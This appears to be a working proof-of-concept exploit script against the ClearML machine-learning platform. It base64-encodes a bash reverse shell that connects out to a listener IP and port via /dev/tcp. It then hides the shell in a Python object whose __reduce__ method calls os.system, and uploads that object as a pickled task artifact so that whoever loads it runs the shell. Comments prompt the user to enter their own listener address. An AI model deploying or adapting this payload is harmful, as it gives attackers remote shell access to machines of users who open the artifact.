import base64, os
from clearml import Task

local_ip = "127.0.0.0" # Put ur listen IP here
local_port = 441 # Put ur listen Port here
project_name = "Project" # Put the project name here

def run_exploit(local_ip, local_port, project_name):
    bash_cmd = f'bash -c "bash -i >& /dev/tcp/{local_ip}/{local_port} 0>&1"'
    codf = base64.b64encode(bash_cmd.encode('utf-8')).decode('utf-8')
    cmd = f'echo {codf} | base64 -d | sh'
    print(cmd)
	
    class exploit:
        def __reduce__(self):
            return os.system, (cmd,)

    task = Task.init(project_name=project_name, task_name='exploit', tags=["review"], output_uri=True)
    task.upload_artifact(name='ls_artifact', artifact_object=exploit(), retries=2, wait_on_upload=True)

run_exploit(local_ip, local_port, project_name)
